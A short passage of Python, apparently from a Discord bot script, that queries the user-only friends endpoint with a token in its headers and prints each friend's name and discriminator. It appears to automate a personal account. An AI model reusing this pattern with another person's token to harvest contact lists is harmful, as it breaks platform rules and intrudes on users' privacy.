        "https://canary.discord.com/api/v8/users/@me/relationships", headers=headers
    )
    for friend in r.json():
        print(f"{friend['user']['username']}#{friend['user']['discriminator']}")
        print(f"{'-'*10}")
    time.sleep(3)
bot.run(TOKEN)